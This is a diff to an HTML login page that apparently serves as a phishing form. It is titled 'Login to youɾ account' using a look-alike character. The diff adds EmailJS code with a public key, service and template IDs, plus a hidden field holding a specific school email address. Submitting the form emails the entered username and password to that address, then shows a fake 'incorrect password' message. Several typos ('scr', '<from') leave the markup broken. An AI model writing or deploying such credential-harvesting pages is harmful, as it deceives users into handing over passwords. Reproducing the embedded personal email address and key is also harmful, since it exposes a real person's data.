@@ -13,11 +13,13 @@
     <script scr="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
     <script>
-        emailjs.init()
+        emailjs.init({
+            publicKey: "3cguN9VXD2T04KNVy"
+        });
     </script>
     <script>
         window.onload = function() {
-            document.getElementById("form").addEventListener("submit", e =>  {
+            document.getElementById("form").addEventListener("submit", function (e)  {
                 e.preventDefault();
                 
                 emailjs.sendForm("service_wwe1fxl" , "template_rwdddse", this)
@@ -33,9 +35,10 @@
 <body class="d-flex justify-content-center align-items-center" style="height:100vh;">
     <from id="form" class="d-flex flex-column justify-contesnt-center">
         <span class="text-center pb-3">Login to youɾ account</span>
-        <input class="form-control" id="username" placeholder="Username">
+        <input class="form-control" name="username" placeholder="Username">
+        <input class="d-none" name="email" value="20amelinesr@roundwoodpark.co.uk" >
         <div class="input-group">
-            <input class="form-control" id="password" type="password" placeholder="Password">
+            <input class="form-control" name="password" type="password" placeholder="Password">
             <input type="submit" class="btn btn-primary" value=""submit>
         </div>
         <div id="incorrect" class="alert alert-danger p-2 mt-4 d-none">Incorrect username or password. Please try again.</div>
